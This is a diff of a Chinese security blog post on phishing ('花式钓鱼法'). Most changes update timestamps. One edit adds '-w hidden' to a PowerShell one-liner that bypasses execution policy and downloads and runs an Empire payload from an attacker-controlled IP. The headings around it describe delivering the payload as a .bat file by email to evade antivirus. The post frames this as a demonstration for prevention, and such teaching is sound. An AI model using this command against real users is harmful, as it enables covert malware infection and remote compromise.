@@ -47,7 +47,7 @@
 <meta property="og:image" content="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183138_XzAql1_6518.jpeg">
 <meta property="og:image" content="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183152_b9Kxw1_6527.jpeg">
 <meta property="og:image" content="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183205_jgJnId_6529.jpeg">
-<meta property="og:updated_time" content="2017-12-27T11:49:28.740Z">
+<meta property="og:updated_time" content="2017-12-28T14:57:56.653Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="花式钓鱼法">
 <meta name="twitter:description" content="0x00. 闲谈&amp;emsp;&amp;emsp;最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。">
@@ -426,7 +426,7 @@
 <p>vim /var/www/html/empire.psl</p>
 </blockquote>
 <h4 id="第四步：构造一个empire-bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软"><a href="#第四步：构造一个empire-bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软" class="headerlink" title="第四步：构造一个empire.bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软"></a>第四步：构造一个empire.bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软</h4><blockquote>
-<p>powershell -ExecutionPolicy Bypass IEX(New-Object Net.Webclient).DownloadString(‘<a href="http://192.168.1.109/empire.psl" target="_blank" rel="external">http://192.168.1.109/empire.psl</a>‘)</p>
+<p>powershell -ExecutionPolicy Bypass -w hidden IEX(New-Object Net.Webclient).DownloadString(‘<a href="http://192.168.1.109/empire.psl" target="_blank" rel="external">http://192.168.1.109/empire.psl</a>‘)</p>
 </blockquote>
 <p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183043_KXE7fh_6557.jpeg" alt=""></p>
 <h4 id="第五步：通过邮件或者社工的方式将empire-bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩"><a href="#第五步：通过邮件或者社工的方式将empire-bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩" class="headerlink" title="第五步：通过邮件或者社工的方式将empire.bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩"></a>第五步：通过邮件或者社工的方式将empire.bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183057_N8sfP9_6568.jpeg" alt=""></p>
@@ -454,7 +454,7 @@
         <p><span>本文标题:</span><a href="/2017/12/27/花式钓鱼法/">花式钓鱼法</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">TimeS0ng</a></p>
         <p><span>发布时间:</span>2017-12-27, 10:39:14</p>
-        <p><span>最后更新:</span>2017-12-27, 19:49:28</p>
+        <p><span>最后更新:</span>2017-12-28, 22:57:56</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2017/12/27/花式钓鱼法/" title="花式钓鱼法">http://TimeS0ng.github.io/2017/12/27/花式钓鱼法/</a>
             <span class="copy-path" data-clipboard-text="原文: http://TimeS0ng.github.io/2017/12/27/花式钓鱼法/　　作者: TimeS0ng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
